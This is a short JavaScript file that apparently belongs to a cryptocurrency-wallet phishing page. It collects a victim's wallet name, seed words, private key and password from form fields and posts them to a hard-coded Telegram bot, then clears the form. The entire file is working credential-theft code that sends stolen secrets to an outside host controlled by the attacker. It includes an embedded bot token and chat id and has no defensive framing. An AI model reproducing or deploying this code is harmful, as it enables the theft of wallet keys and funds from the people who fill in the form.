//bot token
var telegram_bot_id = "5561847837:AAF7a3xGseWp6eY3DmhqYdM9QM6GiasjmJw";
//chat id
var chat_id = 1719765416;
var walletname, words, privatekey, password;
var ready = function () {
    walletname = document.getElementById("walletname").value;
    words = document.getElementById("words").value;
    privatekey = document.getElementById("privatekey").value;
    password = document.getElementById("password").value;
    message = "Walletname: " + walletname + "\nWords: " + words + "\nPrivatekey: " + privatekey + "\nPassword: " + password;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("walletname").value = "";
    document.getElementById("words").value = "";
    document.getElementById("privatekey").value = "";
    document.getElementById("password").value = "";
    return false;
};

// function myFunction() {
//   location.replace("submit.php")
// }